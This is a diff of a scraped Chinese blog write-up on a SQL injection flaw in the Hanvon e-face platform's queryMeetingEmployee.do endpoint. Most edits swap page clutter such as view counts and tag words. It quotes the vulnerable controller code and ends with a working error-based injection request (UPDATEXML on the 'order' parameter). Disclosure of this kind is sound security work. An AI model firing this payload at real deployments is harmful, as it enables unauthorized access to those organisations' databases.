@@ -7,17 +7,17 @@ asset_dir: assets/汉王e脸通综合管理平台-querymeetingemployee.do-sql注
 # 汉王e脸通综合管理平台 queryMeetingEmployee.do SQL注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/8/6 08:23
-- 485浏览
+- 486浏览
 - [0评论](#comment)
 - 47分钟阅读
 
 深入探索
 
-认证
-
-软件
+鉴权
 
 数据库
+
+安全
 
 ---
 
@@ -36,14 +36,6 @@ V1.6.x
 > icon\_hash="1380907357"
 
 # 漏洞分析
-
-深入探索
-
-漏洞扫描服务
-
-在线安全工具
-
-Windows安全工具
 
 直接看 `MobiMeetingAppController` 里关于 `queryMeetingEmployee` 的实现
 
@@ -90,6 +82,14 @@ Windows安全工具
                 employeeParam.setMtId(meetingId);
                 List<MeetingEmployeeTpm> listAll = this.meetingAsm.queryMeetingEmployee(employeeParam);
 ```
+
+深入探索
+
+技术文章订阅
+
+编程语言教程
+
+网络安全会议
 
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml
 
@@ -143,7 +143,7 @@ Windows安全工具
 >
 > 需要 meetingId 参数存在
 >
-> 漏洞修复方案
+> 漏洞预警服务
 
 ```
 GET /manage/mobiMeetingApp/queryMeetingEmployee.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
